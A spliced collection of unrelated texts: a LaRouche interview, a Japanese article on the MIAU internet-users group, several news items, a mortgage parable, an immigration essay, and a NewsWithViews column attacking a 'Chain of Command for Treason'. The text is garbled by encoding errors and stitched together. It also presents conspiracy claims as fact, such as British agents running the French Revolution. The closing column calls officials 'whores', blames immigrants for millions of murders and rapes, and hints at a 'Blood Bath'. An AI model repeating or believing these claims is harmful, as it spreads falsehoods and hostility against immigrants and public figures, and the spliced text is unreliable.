ï¿½ï¿½Why do people call this failure THE PRESIDENT .
Because they are frightened and they 're desperate .
That 's the way fear works .
Fear is used as a weapon to control people .
And it 's used by `` You could be next !'' , `` It could be you next ! ''
`` It could hit you !''
`` It could hit you !'' ``Aah ,
You might be next ! ''
That 's the way it 's done .
This kind of incident , the use of terror as an instrument of government , like this , is not new .
The French Revolution of July 1789 was that .
The French Revolution was organized by the British Government .
Philipe Egalite was an agent of Jeremy Bentham and Company , an agent of Lord Shelburne , who organized the whole organization which ran the July 1789 Revolution on behalf of Jacques Neckar who was an agent of Lord Shelburne .
You think about how the history of Europe was changed by that event and the following event .
The Jacobin Terror was run by British agents from London .
So this is a common business , a common practice in government , to find that these methods are used , these so - called intelligence methods which are used constantly to orchestrate politics by trying to orchestrate mass perceptions .
Yong Tang :
You often say that Western civilization is dying and you 're going to save it .
Why do you say this ?
LaRouche :
Well , because , actually , the history of Europe contains a very important element for all humanity .
It starts with Egypt actually .
Egypt was probably from about 8000 BC emerged as a product of a certain kind of culture which had existed as an international maritime culture , world maritime culture .
Remember , you go back 20,000 years , and the northern hemisphere was dominated by big glaciations in which glaciers ran accumulations of hundreds of feet .
In that period the oceans were four hundred feet lower than they are today , so that the coastal areas then are four hundred feet possibly below the sea level today on our coast .
The development of river populations , as in China , for example , came later .
River populations developed out of maritime populations which are sea-going populations , which after the melting of the glaciers came up the rivers and began to move up the big thick parts of the rivers and to get settlements along the side of the rivers .
So you have the river development , which is the second phase , the first were the oceans .
Now one of the developments was the Nile .
The Nile at that time was a big river because Africa , during this period of the glaciers , was wet .
North Africa was very wet .
It had vast , vast rains .
The desert is now a new phenomenon of the recent 10,000 years , like in the Middle East .
So in that period , the mouth of the Nile was one of the big entry points for the settlement of maritime culture .
So the culture of Europe came out of Egypt , out of this development in Egypt of a special culture which is based on a maritime culture , based on astronomy and astrophysics .
So this culture went through various kinds of crises , but it had a continuity , as we see in the pyramids , the late pyramids of over 5,00 years ago .
So this culture then created Greek culture .
The Greek culture of Thales of Miletus , the culture of the Pythagoreans , the culture of Plato all came out of this .
In this concept , there came the concept of man , of science , what became modern science , it started there .
The idea of the nation - state as a nation of a people as opposed to a nation of conquered peoples , came then .
So the important thing in European civilization is this thread of development , which actually started out of Egypt on the effect on Greece , on Greek culture of this idea of the nation - state , of the nation - state of all the people .
We did n't realize such a civilization , such a state , until the 15th century in Europe .
But the idea of getting such a state was an important idea , the idea of science , the idea of this was of importance for European civilization .
What has happened is the opposition to this has always tried to destroy this , to corrupt it .
We have the Roman Empire and so forth which are efforts to destroy this kind of thing .
So therefore what the world needs is a system of nation - states , it needs a system of sovereign nation - states .
Asia needs that .
All parts of the world need that .
So therefore , what we have in European civilization is the idea of the sovereign nation - state .
These ideas which are traced from Egypt into Greece are very important to humanity as a whole .
Look at China , for example , the question of how to rebuild China as a nation - state after what the British had done .
It was the same thing .
It was this idea .
Sun Yat - sen was off - shore Chinese , educated in Hawaii , became the hero of China , of China 's struggle , and had these ideas .
These ideas were very influential among off - shore Chinese at first , and then they spread back into the mainland .
It was the idea of organizing a Chinese Revolution , a Chinese Republic .
So it is in that sense that these ideas which come from this European experience are one of the precious assets of all humanity .
Therefore , the important thing is not just the nations as such .
The important thing is to save these ideas for humanity .
Take the case of China today .
What are we going to do about the many poor people in China ?
The very large part of the population of China is poor .
How we realize a solution to this problem with the aid of science ?
These ideas are very important .
It 's important to get cooperation around such ideas among nations to solve this problem .
Therefore that 's the importance of Europe .
It 's not just Europe as an area , it 's these ideas , the idea of mankind , the idea of a nation - state .

ネット住民のネコ好きはよく知られたところであるが、この度、しなやかなネコのキャラクターイメージを掲げる団体を立ち上げた。「インターネット先進ユーザーの会」（Movements for Internet Active Users、通称 「 MIAU 」）である。
こ こ2〜3年前から、デジタルコンテンツと著作権に関わる議論、あるいは委員会が数多く開催されるようになってきたのは、すでにご承知の通りである。だが、どうだろう。それらの委員会を経て、我々消費者にとって何かプラスに働く事例があっただろうか。
思い返してみれば、消費者の意向が反映されたのは、2005年の「文化審議会 著作権分科会 法制問題小委員会」において、録画録音補償金に関しては補償金制度の廃止を含めて議論すべき、との結論が出されたこと以降、ないように思う。それほどあの結論は、画期的だった。
ただこれも、後に招集された 「 文化審議会 著作権分科会 私的録音録画小委員会 」においては、制度維持前提ありきの姿勢のまま、さらに著作権法の30条「私的使用のための複製」を改正し、違法サイトからダウンロードした人も違法にすべきという結論が出された。
私的録音録画小委員会にはIT・音楽ジャーナリストの津田大介氏もメンバーに入ってはいるものの、その組閣においては法制問題小委員会において補償金反対派がごっそり抜かれ、そのかわり権利者代表がごっそり入るという事態が起こっている。もはやこの段階で、法制問題小委員会における結論はなかったことにするというレールが、透けて見えていた。
文化庁の文化審議会のもろいところは、そこでの決め事を必ずしも政府が実行する責任がないということである。総務省管轄の審議会と大きく性格が違うのはその点で、立ち位置が全然違う。総務省のは、「これこれの改正を行なう場合には審議会にかけて諮問すべし」と、電気通信事業法や電波法で定義してある。つまり、審議会で審議したら、必ずそれが実行されてしまうのである。
だが文化庁の審議会は、著作権法を扱ってはいるものの、著作権法上には「審議会で諮問すべし」と定義されていない。つまり文化庁の審議会は、その権限や立ち位置がはっきりしないまま、どんどん進められているのである。
これが何を意味するかと言えば、政治的ロビー運動により、審議会の決定を実行してもいいし、潰してもいいということになるわけである。な ん だ そ れ。
なぜ急いだの か
では我々消費者にできることは何か。どうすれば我々の意向を、正しく政治の世界に伝えることができるのか。
まずひとつは、文化審議会などに消費者の代表として、ITとデジタルのテクノロジーがわかる人間を送り込むことである。津田大介氏ひとりがあっちこっちでひっぱりだこという現状では、どう考えてもリソースが足りていない。
もうひとつは、実際に政治を動かす政治家に対して、いかにアプローチするかということである。それには数多くの人間がその後ろに控えていて、消費者の利益に叶う動きをする人や政党は支持する、利益を損なうのなら次の選挙で落とす、という体制を作らなければならない。
つまり、現実の社会を動かすためには、ネット上でいくら騒いでもダメで、実態を持った組織が必要なのだということが、ここ数年の取材を通してわかった。なぜならば現実世界のほうからは、決してネットに対してアプローチしてこないからだ。
MIAU は、ネットの世論を拾い上げ、それを現実社会に対して伝えていく。そういう組織である。将来的にはITとデジタルに強い消費者の代表組織として、誰かをどこかの委員会や審議会に送り込むこともやりたい。もっと言えば、誰か政治家になる人間がいてもおかしくない。そういうところまで行ければ、すごいことだと思う。

Conyers lodges bill to criminalize voter caging Nick Langewis
Published : Thursday January 17 , 2008
del.icio.us |
Print This Email This Congressman and House Judiciary Committee Chairman John Conyers , Jr. ( D - GA ) has introduced a bill to combat voter caging , according to a House press release .
Voter caging is the practice of mailing a letter to a registered voter at his or her recorded address .
In the event that a letter is returned undeliverable , a voter is then flagged : his or her registration , and thereby the subject 's right to vote , faces a legal challenge .
" During the 2004 Election , challengers monitored every single one of Detroit 's 254 polling stations , " said Rep. Conyers today .
" With a Michigan lawmaker advocating ' suppress the Detroit vote , ' it was obvious why the challengers were at every polling place  to create a tense and hostile environment for those eligible voters who simply wished to participate in our democracy by casting a ballot . "
Tens of thousands of voters , including soldiers and college students , are estimated to have been disenfranchised as a result of voter caging .
The Caging Prohibition
Act of 2008 , with nine co-sponsors , seeks to make the practice illegal .
It would effectively bar challenges to votes initiated by voter caging , and prohibit any person other than an election official from challenging a person 's eligibility to vote based on information obtained through caging .
Lodging a questionable challenge would also be classified as a felony .
" Voter caging , " continues Conyers , " is inconsistent with the principle that every eligible citizen should be entitled to the right to vote .
The [ Act ] will clearly define and criminalize voter caging and other questionable challenges intended to disqualify eligible voters . "
The bill 's co-sponsors are : Rahm Emanuel ( D - IL )
Chris Van Hollen ( D - MD )
Xavier Becerra ( D - CA )
Mike Honda ( D - CA )
John Barrow ( D - GA )
John Yarmuth ( D - KY )
Zoe Lofgren ( D - CA )
Steven Cohen ( D - TN )
Keith Ellison ( D - MN )

Guido sold the best pizza in Brooklyn .
He had learned how from his Mama , a woman who understood why fresh matters in the Old Country .
Guido's Pizza was therefore the busiest pizza parlor in Brooklyn , with customers standing in line for a seat .
But Guido was ambitious ; he wanted to expand into the now vacant shop next door so he could serve not only pizza but his Mama 's special Marinara Sauce on their home - made pastas along with those knife thin slices of her special sausage and the roasted Mozzarella cheese dish that they reserved for special holidays .
Then , Guido imagined , he would open up franchises .
Guido fancied the business model of McDonald's , Guido had hopes of becoming an International businessman with several shops in Manhattan .
He sometimes gazed across the water to New York City , promising himself and his Mama , now deceased , that it would be so .
He would even build a shop in their village back in Italy .
His Mama would be proud .
So Guido went down to the see the Capo , Mr. Clametto for a loan .
Mr. Clametto sometimes came by to have a pizza , Clametto was always dressed well , in an expensive suit and bright tie .
Mr. Clametto slapped him on the back and shook his hand .
“ What !
You need money , God forbid you should have to ask when you make the best pizza I had in my life , even home in Sicily .
Vinny will set you up .
Say no more . ”
Vinny had counted out 50,000.00 clams in hundreds on the way out , backed by the full faith and enforcement of Mr. Clametto 's organization , Costa Nostra .
Guido had never seen so much money in his life .
Today , Guido's Pizza has a different kind of clientèle and Guido understands that there was a hook in the cash .
Too much cash always has a hook , embedded deep enough so you do not see it .
There would be no chain of shops serving wonderful food for Guido , only barriers to dreams .
Some racketeers come in flashy ties .
Others wear quieter apparel but the hook is always ready and waiting .
Today Americans are finding the hook in the mortgage they took out on their home .
Some of the mortgages written in the last seven years promised – and gave the borrower – 125 % of the value of the house .
Borrowers could hardly believe that it could be so easy to realize their dreams .
Vacations , desperately needed medical treatments for those they loved , making their home into the vision they had hungered to have when they were still young enough to enjoy it .
There were lots of reasons for borrowing .
But those loans were made when the dollar was solid and real estate seen as an investment that could be expected to be better than gold .
Those dreams are also dying .
You see , your government has found a way to convert your home into a form of currency and you into a serf .

NYC Man Cited for 1775 Submarine Authorities responded after the replica war sub drifted too close to a ship .
Aug. 3 , 2007  --
A man in a Revolutionary War-era submarine was cited by the U.S. Coast Guard for drifting into a security zone , and for unsafe sailing in New York 's East River near the Queen Mary 2 luxury liner , the Coast Guard and New York City Police Department said Friday .
The man in the replica vessel was identified as 35 - year - old Philip " Duke " Riley of Brooklyn , N.Y. , according to Coast Guard spokesman Petty Officer Seth Johnson .
Authorities said it was the second time Riley had floated the vessel in the vicinity of the cruise ship .
The submarine , which reportedly did not have a mechanical propulsion system , was being towed by two other men in a rowboat .
" A makeshift submarine discovered at about 10:30 this morning by an NYPD Intelligence detective onboard the Queen Mary 2 in New York Harbor is the creative craft of three adventuresome individuals , " NYPD Commissioner Raymond Kelly announced in an afternoon press release .
" It does not pose any terrorist threat . "
While Kelly said the Queen Mary 2 will be inspected to ensure the boat 's integrity , and Riley and the two other men could further face NYPD charges , he chalked up the incident as a case of " marine mischief . "
Riley was questioned by police after a guard on the Queen Mary 2 spotted the 8 - by - 4 - foot fiberglass and wood submarine , a replica of a 1775 model called the " Turtle , " within 200 feet of the ship .
The U.S. Coast Guard also responded to the scene .
Oxygen tanks were discovered inside the vessel , but no threatening devices or materials were found onboard .
The " Turtle , " invented in Connecticut by David Bushnell , was the first combat submarine designed to plant explosives on the sides of ships , according to the Encyclopedia Britannica .
A photo gallery posted July 17 , 2007 , on the photo - sharing Web site flickr.com titled " Adventures With an Egg " shows a " Turtle " submarine making a test run in the Red Hook section of Brooklyn , near the spot where Riley was apprehended by authorities today .
The photo slideshow also links to the Web site www.dukeriley.info, the namesake of which is described as " the man behind the madness . "
On that site , Riley describes himself as an " artist " and " patriot , " who combines " populist myths and reinvented historical obscurities with contemporary social dilemmas . "
The statement concludes , " Throughout my projects , I profile the space where water meets the land , traditionally marking the periphery of urban society , what lies beyond rigid moral constructs , a sense of danger and possibility . "

With hundreds of US F - 15 Eagle jets now grounded because of dangerous structural defects , the country 's air defence network is becoming strained somewhat , particularly as Russia has chosen this time to adopt a an aggressive posture in the air space surrounding Western countries .
The F - 15 forms the backbone of the fighter command at many of the 16 or so " alert " sites around the United States , where planes and pilots are at a constant standby to take off at a moment 's notice to intercept unidentified aircraft in the nation 's airspace .
The US Air Force grounded about 450 F - 15s after one of the fighters began to break apart in the air and crashed in the US State of Missouri in November .
An US Air Force investigation found " possible fleet - wide airworthiness problems " because of defects in the metal rails that hold the fuselage together .
It is not clear when the F - 15s will be allowed to fly again .
A relatively small number of F - 15s , the F - 15E Strike Eagle , were not found to be affected , and have not been grounded .
For defence operations managers , the problem is compounded by the fact that the replacement fighter , the F - 16 , is already in high demand for operations in Iraq , while the state - of - the art next - generation fighter , the F - 22 Raptor , is only being inducted into service very slowly and is not available in sufficient numbers .
According to US military officials , they have patched in holes in the nation 's air defence system quickly , so that no security risk exists .
However , the act of spreading resources thinner across the system is also proving to be a strain .
For the sensitive outpost of Alaska , which borders Russian airspace , Canadian CF - 18s Hornets filled in the void for three weeks in November .
The Canadian fighters scrambled several times , to " do an identification " of Russian bombers participating in exercises outside US airspace near Alaska .
They report that Russian warplanes have been flying exercises near Alaska and Canada with increasing frequency in recent months .
Currently , a brand - new squadron of F - 22 Raptors based in Alaska , is standing in for the grounded F - 15s .

BOSTON ( Reuters ) - Thirteen percent of healthy adults were found to have some type of undiagnosed -- but likely harmless -- abnormality in the brain , according to a Dutch study published on Wednesday .
The research , led by Meike Vernooij of the Erasmus MC University Medical Center in Rotterdam , is important because brain scans are becoming more common and more detailed , and doctors need to know whether to be concerned if they stumble onto something unexpected .
Vernooij and colleagues looked at MRI scans of 2,000 volunteers over the age of 45 .
Magnetic resonance imaging or MRI can give a detailed picture of physical brain structures .
Just over 7 percent showed evidence of a brain clot , but the clots were too small to produce symptoms and seemed to be more common with age .
Nearly 2 percent had a brain aneurysm , which is a bulge in a blood vessel that can burst if it becomes too big , causing a stroke .
But 32 of the 35 aneurysms were so small , the researchers did not suggest follow - up medical treatment .
The younger volunteers were just as likely to have them as older ones .
The scans also uncovered 32 tumors .
All but one were benign .
Thirteen people had more than one abnormality , Aad van der Lugt , another member of the team , said .
As MRI scans become more sensitive , they “ will probably increase the number of small brain abnormalities detected ” and doctors will need to know which ones can be safely ignored , the researchers wrote in the New England Journal of Medicine .
“ Unfortunately , we know little of the natural course of these asymptomatic findings , ” Van der Lugt wrote in an e-mail .
“ It may well be that the clinical course and relevance of these unexpected asymptomatic findings differ from those of similar symptomatic findings for which persons seek medical treatment , ” he added .
Tracking such “ incidental ” abnormalities “ will hopefully provide more information on this that will be useful for both researchers and clinicians , ” he said .
Illegal Immigration
Most people agree that illegal immigration is wrong , because it is not fair to taxpayers and legal immigrants .
Nevertheless , illegal immigrants , also known as illegal aliens , have many reasons for illegally crossing borders or overstaying their visas .
For instance , illegal aliens may be avoiding war , looking for work , reuniting with family , evading their government for political reasons , escaping criminal activity , and / or needing medical aid are just a few of the most common reasons .
Even though all of these reasons are understandable and justifiable to leave a country , these reasons do not excuse illegal immigration .
The main reason why illegal immigration is unfair is because illegal aliens are a burden to taxpayers for several reasons .
For instance , illegal immigrants are typically entitled to free social services .
For example , hospitals and emergency rooms are obligated to treat all patients even if they can not or do not pay for it .
Illegal aliens can receive welfare checks and food stamps .
Sometimes , governments assist illegal immigrants with job searches and transportation to jobs .
The children of illegal immigrants , who are often also illegal immigrants , are entitled to education thus overcrowding schools and decreasing the quality of the education .
Furthermore , it is perceived that illegal immigrants do not pay any or as much in taxes compared with legal residents , thus they should not receive free social services .
In truth , illegal aliens do pay at least some of the taxes that regular citizens and legal immigrants do pay .
The actual statistics and numbers of what is not paid are impossible to calculate .
Furthermore , illegal immigrants are attributed with job losses for legal residents especially for lower income jobs .
In addition , higher crime rates are also sometimes associated with illegal aliens .
Illegal immigration is even unfair to the illegal aliens , since they are politically and economically restricted .
And finally if and when illegal immigrants are caught , these illegal aliens could be sent to jail and / or deported from the country , again at a cost to the taxpayers .
On the other hand , there are several reasons why illegal immigration is good for a country .
First , businesses can more easily succeed and possibly earn profits with the lower salaries given to illegal aliens .
As a result , local services and goods have a lower price for legal and illegal residents .
All in all , the local economies do receive a boost from illegal immigration .
However , it is believed that there is an overall net loss for taxpayers when comparing how much taxes illegal immigrants pay compared to the social services they receive .
Furthermore in general , wealthy people , especially business owners , tend to profit more from illegal immigrants while poor people suffer more .
Finally , it is not fair when compared to immigrants who work hard to legally enter and stay in the country .
As a result , illegal immigration is overall significantly unfair to most legal residents .
There are three basic solutions to help resolve this issue .
First , prevent illegal aliens .
Second , deport all illegal aliens .
Third , allow illegal aliens to become legal residents .
Let s review each of these solutions .
The only way to prevent illegal aliens is with better border security and tracking down each person who overstayed their visa .
First , it is technically impossible to have a perfect border security , especially when a country has huge borders such as the United States of America .
Similarly , finding all illegal citizens who have overstayed their visas is not possible .
Therefore , this individual solution is not perfect by itself , yet this solution is part of the overall plan to help prevent illegal immigrants .
The second solution for deporting all illegal aliens has the issue on how to find them .
The solution here is by restricting their ability to reside in the country .
For example , by not giving drivers licenses , marriage licenses , or any other form of identification to illegal aliens and giving legal immigrants licenses and identifications that expire when their visas expire is a good start with limiting their ability to function in the country .
Therefore when an illegal alien is arrested or stopped by a police officer with expired or no papers , then they will be immediately held for later deportation .
Similarly , stop most social services for illegal residences , such as welfare , food stamps , and education .
I would not prevent medical needs , but all hospitals and emergency rooms would be required to immediately report all illegal aliens to the authorities .
At the same time , this will prevent some birthright citizenships , that is when a child becomes a citizen in the country that the child was born in rather than the citizenship of the childs parent ( s ) .
It would also be necessary to not give birthright citizenship to children of legal immigrants and tourists too , since this is a legal method for non-citizens to stay in the country to take care of the children who are citizens and can not be deported .
This solution might not be popular , but it would be effective in decreasing the number of illegal immigrants .
The final solution is to allow illegal aliens to become legal residents and ultimately maybe even citizenship , thus illegal aliens would become legal residents who would pay their share in taxes ..
This solution would anger a great deal of people .
First , legal immigrants would feel cheated that they followed the laws and the slow bureaucratic process in becoming residents while illegal immigrants were not obligated to do so .
Second , most citizens believe that illegal immigrants should be punished and by giving them residency is the opposite of punishment .
As a result , this solution is not popular with the population of any country .
In conclusion , illegal immigration is unfair for taxpayers , citizens , residents , and even the illegal aliens too .
Unfortunately , there is no perfect solution for illegal immigration ; however this is a problem that needs solving as quickly as possible .
The faster illegal immigration is resolved , the better it is for everyone .

“ That may be true , ” said Alderman Sam Shropshire , the sponsor of the bill here .
“ But what they do n’t tell you is that to make 100 billion plastic checkout bags per year , which is how many we use in the U.S. each year , it takes 12 million barrels of oil .
No oil is used to produce recycled paper checkout bags . ”
Jeffrie Zellmer , legislative director of the Maryland Retailers Association , said it took far less energy to recycle plastic than to recycle paper .
Mr. Zellmer added that 90 percent of retailers used plastic bags and that costs could increase threefold or sixfold , eventually reaching consumers .
The commercial recycling coordinator for the City and County of San Francisco , Jack Macy , said that nationally 1 percent of all plastic checkout bags were recycled .
“ That means the rest end up in landfill , ” Mr. Macy said .
“ And so the argument about plastic recycling being energy efficient is n’t a strong one . ”
“ Look , ” Mr. Shropshire said , “ in the end , the best option is for people to bring their own reusable bags .
But if they fail to do that , then they can use paper bags that biodegrade faster than plastic and yet do not require any trees to be cut down . ”
At the hearing , a lobbyist for Safeway called the bill un-American , saying it would take choices away from consumers .
For now , Mayor Ellen O. Moyer of Annapolis , a Democrat , remains undecided on the measure .
A spokesman for Ms. Moyer , Ray Weaver , said the city planned to distribute reusable bags to residents by the fall .
To accomplish that , Mr. Weaver said , the city is considering teaming with sail makers to use excess material that teenagers in a jobs program may sew into sacks .

DEFEATING THE " CHAIN OF COMMAND FOR TREASON "
By Andrew C. Wallace
November 17 , 2007
NewsWithViews.com
ï¿ ½Chain of Command for Treasonï¿½ is the Evil Alliance among Elites . their Foundations and Corporations with Government Officials to Loot and Destroy America .
This statement is not the least bit exaggerated or hypothetical , it is based on todayï¿½s cold hard brutal reality .
These Elites and their whores in government are involved in the most dastardly and deadly Treason in recorded history , second only to that of Judas Iscariot .
Those in the ï¿ ½Chain of Command for Treasonï¿½ are responsible for the continuing Murder , Killing , Rape , Molestation and Robbery of Millions of Americans by Invaders so they could profit from cheap labor .
Their well paid Whores in Government refuse to obey our Constitution and Laws to stop the invasion or to deport the illegals .
Government
Whores even frame and jail those who try to enforce our laws as an example to others .
Actions by many in government are Unconstitutional , Unlawful and Treasonous .
One of the most heinous and diabolical actions by the ï¿ ½Chain of Command for Treasonï¿½ has been the systematic and ongoing impoverishment of Americans since 1913 with the Federal
Reserve by reducing value of the currency and our assets for the benefit of Elites .
Tax free foundations allowed Elites to maintain and increase their wealth and control of our country over time .
The most recent example was mortgage bailout of the Financial Corporations saving them from failure by lowering interest rates and putting Billions of dollars into the banking system .
This resulted in devaluation of the dollar , reduction in value of your savings and increased costs for gas , heating oil , food and everything average Americans need to live .
In simple terms they transferred the loss from the Elites to average Americans by increasing the money supply and inflation , which they have been doing since 1913 .
The Elitist father of Governor Eliot Spitzer of New York bought the governorship of New York as a toy for his spoiled arrogant power mad son , who trashed the federal and state Constitutions .
Spitzer unilaterally ordered that Driverï¿½s Licenses be given to illegals in violation of both Federal and State law .
This would compromise our security , increase government benefit costs and result in a voter fraud so massive that it would destroy our Sovereignty .
Hillary Clinton supports his actions .
Spitzer got elected the way any Elite would by the use of money and power .
Michael Rothfeld of Newsday reported on 6-22-06 that Spitzerï¿½s father used assets valued at nearly $ 500 million to get him started in politics .
A family charity donated at least $ 140,000 to groups led by political allies .
His parents and brother donated $ 326,000 .
Read the Rothfeld article for all the outrageous details involving Foundations .
At his inauguration Spitzer said ï¿ ½We must rebuild our economy so that it is ready to compete on the global stage in the next century .ï¿½
This is code for : you will make no more than a worker in China and you will be our slaves in the One World Order .
The ï¿ ½Chain of Command for Treasonï¿½ owns the media and refuses to inform the public of even their existence much less attempts to enslave us in poverty .
Have you ever seen a negative story in the media about Illegals , NAFTA , CAFTA , WTO , or even a mention of the existence of the North American Union ?
They want a One World Order and former President
Bush said many times that they were going to get it .
They are in fact getting it with trade Agreements and treaties that give away our wealth , jobs , sovereignty and just about everything .
We can only win this fight if we inform and motivate the people .
But the issues are so complex and outrageous that most people have a hard time understanding , much less believing the truth .
The first thing we must do is to label and identify the enemy in a simple and descriptive manner as the ï¿ ½Chain of Command for Treason .ï¿½
This description tells the person a lot in a few words and will be remembered
If other writers and fighters will use ï¿ ½Chain of Command for Treasonï¿½ to identify and tie their work to others .
If someone comes up with a better description I will use it , but no one has and it is imperative that we have a universal description .
You should organize your presentation so that people can see where it fits in the big picture .
There are two types of people we must reach , those who read and care , and those who do not read but must be informed and motivated in simple terms .
You must tell people how they are being harmed right now , today , in specific graphic terms .
If you make the people angry they will be more motivated .
Repetition is essential to reinforce the learning process required for us to win .
If we donï¿½t coordinate and reinforce each otherï¿½s efforts in this manner we will fail because there will be no continuity to reinforce the learning process .
Many Americans are only perceiving various unconnected charges that do not motivate them to action .
In Marketing every contact must reinforce the others if you can ever hope to inform and motivate the public .
Every communication must tell citizens with a sense of urgency what they can do .
Everyone must continue to write and inform people in their own way , but I beg you to use these principles and connect it to the work of others using ï¿ ½Chain of Command for Treason .ï¿½
Frankly , I have great respect and even awe for other writers and fighters in this struggle .
But they seem to have little appreciation of Marketing ï¿½s Power , which is one thing I know very well after a lifetime of experience .
Some will say that we won the Amnesty fight in the Senate while everyone in this fight was doing his or her own thing and ignoring Marketing .
That is true , but the ï¿ ½Chain of Command for Treasonï¿½ did the advertising for us by supporting marches by illegals and using their corporate media to promote them .
They will not make this mistake again .
We only won a battle .
We could still lose the war because they are trying to pass the amnesty a piece at a time and there is no way that we can motivate the people to fight it every week .
This was the fifth time we had to beat them and they had 52 votes .
They only need to buy eight more votes and they win .
Illegals are only part of the problem and most people have no idea about the rest of it .
I will bet that most of your extended family , like mine does not have a clue , or will not give a damn until they are terrified by grim reality as in Nazi Germany .
We should not think that our enemies will overlook our actions .
Remember that these greedy ruthless traitors have allowed millions of innocent Americans to be murdered , killed , raped , molested and robbed by their illegal invaders .
They have caused millions of Americans to lose their jobs , pensions , benefits , housing , health care , freedom and self respect .
I guarantee that if you do not resist , the ï¿ ½Chain of Command for Treasonï¿½ will force you into abject poverty where you will die homeless hungry and in pain .
Do you really think there is any difference between our Elites , who have proven their depravity and Hitler or Stalin ?
Read the Declaration of Independence and our Constitution so you will understand that this is our land and the power of government comes from we the people .
Many Americans died for this country and more are doing so almost every day .
I implore all of you to fight like everything you value including your lives depends on it and that it really does .
But you must ï¿½obey the rule of law and avoid entrapmentï¿½ if we are to save our Sovereignty and Great Constitution .
We know for a fact that these people hold us in such low esteem that they will allow millions of innocent Americans to be murdered , killed , raped , and molested just so they can make more Blood Money from cheap labor .
We also know that they have framed and imprisoned law enforcement officers for trying to protect us .
If they will do all of this to the innocent , can you imagine what they will do to Patriots who oppose them ?
There is nothing so vile that they will not do to protect their power and Billions of Dollars in Blood Money .
I am not trying to scare you I am only warning of the real dangers that many of you do not want to believe .
You have three choices , either you can fight and win as a patriot , be a Lazy Coward or conspire with the enemy as a Judas Goat .
The ï¿ ½Chain of Command for Treasonï¿½ is our enemy and they have all the money , power and media .
But they are scared to death of average Americans because there are so many millions of us and so few of them .
They may think they can win by using the Military but that will not work because our military understands the meaning of Lawful Orders and the Nuremburg Trials .
The military also does not like our enemies .
Our real protection is our constitutional right to keep and bear arms which was given us to deter government Tyranny as it exists today .
Now you know why elites are desperate for gun control .
If we use those arms we have failed .
Our second most powerful protection is the right to trial by Jury .
Contrary to common knowledge the jury is the most powerful force in our government as specified in the fifth and sixth amendments to the United States Constitution .
Jurors have the power to ignore the courtï¿½s instructions and bring in a not guilty verdict contrary to law and the facts .
See Horning v. District of Columbia and numerous other cases .
People must learn of this power so they can use it when serving on juries .
If you are framed and prosecuted insist on a jury trial and get a lawyer with guts who does not know or work with the prosecutors and judges in your area .
Our enemies do not care about fair or just , they will do whatever it takes to enslave us .

As a Patriot , can you do less for your country than to see that every elected official at all levels of government is denied election or reelection unless they agree that they will serve all citizens and accept no benefits whatever , not even a cup of coffee from anyone .
Campaign contributions must be limited to $ 100 Dollars per citizen per candidate per election otherwise those with wealth will continue to control our politicians .
Candidates must swear to enforce all laws and obey the constitution as it was written .
They must agree to protect the American people by use of whatever force is required to protect our borders , deport illegals and prosecute employers of illegals on an expedited basis .
They must agree to fire or impeach all government officials especially judges who fail to obey the law or our Constitution .
There must be zero immigration for ten years , an end to citizenship for children of illegals and visas must be required of all visitors .
All of this and more must be agreed to in writing , signed and notarized .
The elections of 2008 are critical for our survival as a free nation .
If we can not clean house in 2008 I donï¿½t think we will have the votes in the future to effect change because of massive voter fraud made possible by Gov. Elliot Spitzer and supported by democratic leaders like Hillary Clinton .
Citizens of New York and the country will lose their sovereignty and security thru massive voter fraud , and once it is gone it will take a Blood Bath to get it back .
This alone could bring on Armageddon .
But , the ï¿ ½Chain of Command for Treasonï¿½ is attacking us on multiple fronts and if they win in any one of them it would bring on Death and Destruction resulting in a Pyrrhic victory by the American people .
Political parties are a way to keep politicians honest , provided voters are actively involved and one group does not control BOTH parties .
The ï¿ ½Chain of Command for Treasonï¿½ owns and controls BOTH parties .
Leaders of the Democratic party are Socialists and Communists who are in bed with the Fascists who control the Republican party .
The Elites , their Foundations and Corporations do not give a damn what kind of government we have so long as they control it , and they damn sure do .
There is no difference in the leadership of either party .
President Bushï¿½s plan for illegals was identical to that of the Democratic Leadership .
The only thing that saved us was Patriots in both parties combined with others who were more afraid of the people than their party leaders .
Average Democratic Liberal and Republican Conservative voters are decent people who have been misled by party propaganda and a media that is owned by the enemy .
The Communist and Fascist leaders of these parties are ruthless power mad lying traitors with a common objective , your enslavement .
Why did Democrat Sandy Berger who was caught stealing classified documents receive a slap on the wrist by the Republican administration when he should have been in jail for 20 years ?
Now Hillary Clinton in an arrogant move appoints him to her campaign staff .
Our politicians know exactly how Millions of Americans are being murdered , killed .
raped , robbed and molested by Illegals and the ï¿ ½Chain of Command for Treasonï¿½ for Blood Money .
They know how we will lose everything , but most of them do not give a damn as long as they get their cut of the Blood Money because they feel that we are too dumb to do anything about it .
Here are quotes from Clinton and Obama from CNN after the last Amnesty vote .
Hillary Clinton : ï¿½ I am disappointed that the Senate failed to pass the Dream Act .
The enactment of this legislation is long overdue and I will continue to fight for its passage for all of our children and our nation .ï¿½ Barrack Obama:ï¿
½For the millions here illegally , but otherwise playing by the rules , we must encourage them to come out of hiding and get right with the law .ï¿½
These arrogant and meaningless statements were made knowing that at least 80 % of the American people are strongly opposed .
They ignore and hold us in contempt .
Do these two sound like they are representing Americans or lining their pockets with Blood Money .
Newsweek reported on Oct. 24 , 2007 ï¿ ½that a South Los Angeles street gang targeted African ï¿ ½American gang rivals and other Blacks in a campaign of neighborhood ï¿ ½Cleansing ï¿½ Federal Prosecutor says .ï¿½
The National Bureau of Economic Research recently reported that 40 % of the unemployment of Blacks was due to Illegals .
There are millions of other crimes by illegals but the corporate owned media will not report it unless it is as bad as the NJ massacre .
Any legislator who supports illegals is exactly like the Slaver who sold his own people into Slavery .
Any poor or middle class person , Black or White , who votes for supporters of illegals is an ignorant damn fool .
The media refuses to tell you that it is very dangerous in areas of sanctuary cities or anywhere you find many illegals .
You are responsible for your own self defense .
Those in government refuse to protect you even if they could , which they cannot .
Unless you are a PC fool , or a poor devil living in New York you must learn to shoot and get a carry permit .
If you want to continue to enjoy your life you must get into politics and vote for politicians who are representing your best interests .
You do this by being very plain spoken and demanding written promises .
Get in their face in every possible way .
Use the phone , internet , talk radio and demonstrations .
Be polite , but damn forceful .
Vote for the best person regardless of party .
The political parties themselves deserve no support until they are run by and for the American people rather than the communist left or fascist right who are socialist partners .
Communist leaders of the Democrat party want ignorant illegals to vote for them and the Fascist leaders of the Republican party want cheap illegal labor .
Elites donï¿½t care who wins because they control both parties and get what they want in either case .
Most Republican legislators ignored their leaders and voted against amnesty , while most Democrats followed orders and voted for amnesty .

If we fail to stop the traitors before most Americans experience real pain it will result in bloody class warfare .
The American people would of course win a Pyrrhic Victory in this conflict .
One consequence is that Blacks and Whites are coming together in a common cause .
